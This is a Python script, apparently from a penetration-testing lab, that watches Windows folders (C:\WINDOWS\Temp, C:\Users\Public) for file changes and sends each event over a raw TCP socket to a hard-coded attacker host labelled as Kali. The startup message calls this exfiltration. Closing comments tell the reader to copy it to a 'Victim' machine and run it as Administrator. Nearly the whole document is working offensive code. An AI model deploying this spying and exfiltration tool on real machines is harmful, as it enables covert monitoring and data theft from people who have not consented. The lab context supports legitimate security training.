# ==========================================
# LIBRARY DEFINITIONS
# ==========================================
import os
import win32file
import win32con
import threading
import socket

# ==========================================
# CONFIGURATION
# ==========================================
ATTACKER_IP = "192.168.72.111"  # Your Kali IP
ATTACKER_PORT = 9999  # Your Kali Port

# We watch these folders for activity
DIRS_TO_MONITOR = ["C:\\WINDOWS\\Temp", "C:\\Users\\Public"]


def send_data(log_message):
    """
    Connects to Kali and sends the log.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        s.send(f"{log_message}\n".encode())
        s.close()
    except Exception as e:
        # If Kali isn't listening, we just print locally
        print(f"[!] Network Error: {e}")


def start_monitor(path_to_watch):
    # Map Windows event codes to human-readable names
    ACTIONS = {
        1: "CREATED",
        2: "DELETED",
        3: "MODIFIED",
        4: "RENAMED_FROM",
        5: "RENAMED_TO"
    }

    print(f"[*] Monitor Thread Started for: {path_to_watch}")

    h_directory = win32file.CreateFile(
        path_to_watch,
        win32con.GENERIC_READ,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None
    )

    while True:
        try:
            results = win32file.ReadDirectoryChangesW(
                h_directory,
                1024,
                True,
                win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                win32con.FILE_NOTIFY_CHANGE_SIZE |
                win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                win32con.FILE_NOTIFY_CHANGE_SECURITY,
                None,
                None
            )

            for action, file_name in results:
                full_path = os.path.join(path_to_watch, file_name)
                action_name = ACTIONS.get(action, "UNKNOWN")

                # Format the log
                log_msg = f"FILE ALERT: [{action_name}] {full_path}"

                # Print locally
                print(log_msg)

                # Send to Kali
                send_data(log_msg)

        except Exception as e:
            pass


def start_monitoring_threads():
    print(f"[*] Spawning threads. Exfiltrating to {ATTACKER_IP}:{ATTACKER_PORT}...")
    for path in DIRS_TO_MONITOR:
        t = threading.Thread(target=start_monitor, args=(path,))
        t.start()


if __name__ == '__main__':
    start_monitoring_threads()


#Your Mission
#Transfer: Move file_monitor.py to your Windows 10 Victim (109).
#Execute: Run it as Administrator (it needs permission to watch C:\Windows\Temp).
#Generate Noise:
#Open File Explorer.
#Navigate to C:\Users\Public.
#Right-click -> New -> Text Document.
#Rename it.
#Delete it.
